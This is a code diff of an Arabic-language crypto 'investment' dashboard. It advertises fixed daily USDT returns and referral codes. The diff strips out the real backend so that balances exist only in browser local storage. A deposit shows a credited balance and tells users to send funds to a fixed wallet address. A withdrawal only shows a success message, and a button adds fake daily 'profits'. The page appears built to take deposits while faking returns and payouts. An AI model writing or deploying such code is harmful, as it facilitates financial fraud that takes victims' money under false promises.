@@ -4,7 +4,6 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>لوحة التحكم</title>
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -93,6 +92,12 @@
     </div>
 
     <div class="card">
+      <h2 class="card-title">👥 رمز الدعوة الخاص بك</h2>
+      <p id="referralCode" style="text-align: center; font-size: 24px; font-weight: bold; color: #e94560;"></p>
+      <button onclick="navigator.clipboard.writeText(document.getElementById('referralCode').innerText)" style="width: 100%; background: #2d3748; color: white;">📋 نسخ رمز الدعوة</button>
+    </div>
+
+    <div class="card">
       <h2 class="card-title">📊 خطط الاستثمار</h2>
       <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 12px;">
         <div style="background: #0f0f1a; padding: 16px; border-radius: 12px; text-align: center;"><h3 style="color: #e94560;">مبتدئ</h3><p style="font-size: 24px; font-weight: bold;">2%</p><p>من 10 USDT</p></div>
@@ -101,14 +106,36 @@
         <div style="background: #0f0f1a; padding: 16px; border-radius: 12px; text-align: center;"><h3 style="color: #e94560;">دياموند</h3><p style="font-size: 24px; font-weight: bold;">3.5%</p><p>من 1000 USDT</p></div>
       </div>
     </div>
+
+    <button id="profitBtn" style="width: 100%; background: #e94560; color: white; margin-top: 24px;">🎁 احصل على أرباح اليوم</button>
   </div>
 
   <script>
-    const SUPABASE_URL = 'https://ixnjzzhxmxjtcnbqaomq.supabase.co';
-    const SUPABASE_ANON_KEY = 'sb_publishable_b2QCsdG8mtoRKVyLdhqAdw_UbxR3OI9';
-    const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    let currentUser = null;
 
-    let userData = null;
+    function loadUser() {
+      const user = localStorage.getItem('currentUser');
+      if (!user) {
+        window.location.href = '/';
+        return;
+      }
+      currentUser = JSON.parse(user);
+      
+      document.getElementById('activeDeposit').innerHTML = (currentUser.active_deposit || 0) + ' USDT';
+      document.getElementById('availableBalance').innerHTML = (currentUser.available_balance || 0) + ' USDT';
+      document.getElementById('balanceInfo').innerHTML = `الرصيد المتاح: ${(currentUser.available_balance || 0)} USDT`;
+      document.getElementById('referralCode').innerHTML = currentUser.referral_code || 'XXXXXX';
+    }
+
+    function saveUser() {
+      let users = JSON.parse(localStorage.getItem('users') || '[]');
+      const index = users.findIndex(u => u.id === currentUser.id);
+      if (index !== -1) {
+        users[index] = currentUser;
+        localStorage.setItem('users', JSON.stringify(users));
+        localStorage.setItem('currentUser', JSON.stringify(currentUser));
+      }
+    }
 
     function showMessage(msg, type) {
       const div = document.getElementById('messageDiv');
@@ -116,48 +143,27 @@
       setTimeout(() => div.innerHTML = '', 5000);
     }
 
-    async function loadData() {
-      const { data: { user } } = await supabase.auth.getUser();
-      if (!user) {
-        window.location.href = '/';
-        return;
-      }
-
-      const { data } = await supabase.from('users').select('*').eq('id', user.id).single();
-      userData = data;
-      
-      document.getElementById('activeDeposit').innerHTML = (data?.active_deposit || 0) + ' USDT';
-      document.getElementById('availableBalance').innerHTML = (data?.available_balance || 0) + ' USDT';
-      document.getElementById('balanceInfo').innerHTML = `الرصيد المتاح: ${(data?.available_balance || 0)} USDT`;
-    }
-
-    document.getElementById('logoutBtn').onclick = async () => {
-      await supabase.auth.signOut();
+    document.getElementById('logoutBtn').onclick = () => {
+      localStorage.removeItem('currentUser');
       window.location.href = '/';
     };
 
-    document.getElementById('depositBtn').onclick = async () => {
+    document.getElementById('depositBtn').onclick = () => {
       const amount = parseFloat(document.getElementById('depositAmount').value);
       if (!amount || amount < 10) {
         showMessage('⚠️ الحد الأدنى للإيداع 10 USDT', 'error');
         return;
       }
       
-      const { error } = await supabase.from('deposit_requests').insert({
-        user_id: userData.id,
-        amount: amount,
-        status: 'pending'
-      });
+      currentUser.active_deposit = (currentUser.active_deposit || 0) + amount;
+      saveUser();
       
-      if (error) {
-        showMessage('❌ ' + error.message, 'error');
-      } else {
-        showMessage(`✅ تم تقديم طلب إيداع بقيمة ${amount} USDT`, 'success');
-        document.getElementById('depositAmount').value = '';
-      }
+      showMessage(`✅ تم تقديم طلب إيداع بقيمة ${amount} USDT. يرجى إرسال المبلغ إلى المحفظة: 0x987cfde723a87b5ed33329eebe0595a4416b848f`, 'success');
+      document.getElementById('depositAmount').value = '';
+      loadUser();
     };
 
-    document.getElementById('withdrawBtn').onclick = async () => {
+    document.getElementById('withdrawBtn').onclick = () => {
       const amount = parseFloat(document.getElementById('withdrawAmount').value);
       const address = document.getElementById('walletAddress').value;
       
@@ -169,28 +175,35 @@
         showMessage('⚠️ يرجى إدخال عنوان محفظة BSC', 'error');
         return;
       }
-      if (amount > (userData?.available_balance || 0)) {
+      if (amount > (currentUser.available_balance || 0)) {
         showMessage('⚠️ الرصيد غير كافٍ', 'error');
         return;
       }
       
-      const { error } = await supabase.from('withdrawals').insert({
-        user_id: userData.id,
-        amount: amount,
-        wallet_address: address,
-        status: 'pending'
-      });
+      currentUser.available_balance = (currentUser.available_balance || 0) - amount;
+      saveUser();
       
-      if (error) {
-        showMessage('❌ ' + error.message, 'error');
-      } else {
-        showMessage(`✅ تم استلام طلب سحب ${amount} USDT`, 'success');
-        document.getElementById('withdrawAmount').value = '';
-        document.getElementById('walletAddress').value = '';
-      }
+      showMessage(`✅ تم استلام طلب سحب ${amount} USDT إلى المحفظة: ${address.substring(0, 10)}...`, 'success');
+      document.getElementById('withdrawAmount').value = '';
+      document.getElementById('walletAddress').value = '';
+      loadUser();
     };
 
-    loadData();
+    document.getElementById('profitBtn').onclick = () => {
+      const profit = (currentUser.active_deposit || 0) * 0.02;
+      if (profit <= 0) {
+        showMessage('⚠️ لا يوجد استثمار نشط لحساب الأرباح', 'error');
+        return;
+      }
+      
+      currentUser.available_balance = (currentUser.available_balance || 0) + profit;
+      saveUser();
+      
+      showMessage(`✅ تم إضافة ${profit.toFixed(2)} USDT كأرباح يومية!`, 'success');
+      loadUser();
+    };
+
+    loadUser();
   </script>
 </body>
 </html>
